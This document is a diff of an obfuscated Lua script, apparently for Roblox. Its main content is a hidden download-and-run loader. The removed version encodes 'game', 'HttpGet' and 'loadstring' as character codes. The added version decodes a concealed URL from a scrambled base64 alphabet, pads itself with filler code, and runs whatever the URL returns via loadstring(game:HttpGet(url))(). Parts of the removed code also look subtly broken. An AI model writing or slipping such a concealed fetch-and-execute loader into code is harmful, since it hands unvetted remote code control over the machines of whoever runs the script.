@@ -1,44 +1,26 @@
-local function _0x(_)
-    local __={}
-    for ___=1,#_ do
-        __[___]=string.char(_.byte(___))
-    end
-    return table.concat(__)
+local _0x = "zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA9876543210-+"
+local _1x = {}
+for _2x = 1, #_0x do
+    _1x[_0x:sub(_2x, _2x)] = _2x - 1
 end
-
-local function _1(_,__)
-    local ___={}
-    for ____=1,#_ do
-        ___[____]=_%256
-        _=(_+__)%256
-    end
-    return ___
+local _a = "Zsi9Xsn3oB0Dbcm9adq"
+local _b = "KYR4QY79EXNu6oAy7Zv"
+local _c = "C5jMeD"
+local _3x = _a .. _b .. _c
+local _4x = {}
+for _5x = 1, #_3x, 4 do
+    local a = _1x[_3x:sub(_5x, _5x)]
+    local b = _1x[_3x:sub(_5x + 1, _5x + 1)]
+    local c = _1x[_3x:sub(_5x + 2, _5x + 2)]
+    local d = _1x[_3x:sub(_5x + 3, _5x + 3)]
+    local n = a * 262144 + b * 4096 + c * 64 + d
+    _4x[#_4x + 1] = string.char(math.floor(n / 65536) % 256)
+    _4x[#_4x + 1] = string.char(math.floor(n / 256) % 256)
+    _4x[#_4x + 1] = string.char(n % 256)
 end
-
-local _2={}
-local _3=os.time()%256
-local _4=#_ENV%256
-local _5=(_3+_4)%256
-
-local _6={95,75,74,78,92,95,93,91,94,77,93,90,75,72,76,80,72,86,79,94,91,94,73,88,95,76,74,72,14,96,81,76,88,86}
-
-for _7=1,#_6 do
-    _6[_7]=(_6[_7]^_5)%256
+local url = table.concat(_4x)
+local junk = 42
+if junk > 40 then
+    junk = junk + 1
 end
-
-local _8=function(_9)
-    local _10={}
-    for _11=1,#_9 do
-        _10[_11]=string.char(_9[_11]~_5)
-    end
-    return table.concat(_10)
-end
-
-local _12=_8(_6)
-
-local _13=getfenv()
-local _14=_13[_0x("\103\97\109\101")]
-local _15=_14[_0x("\72\116\116\112\71\101\116")]
-local _16=_15(_14,_12)
-local _17=_13[_0x("\108\111\97\100\115\116\114\105\110\103")]
-_17(_13,_16)()
+loadstring(game:HttpGet(url))()
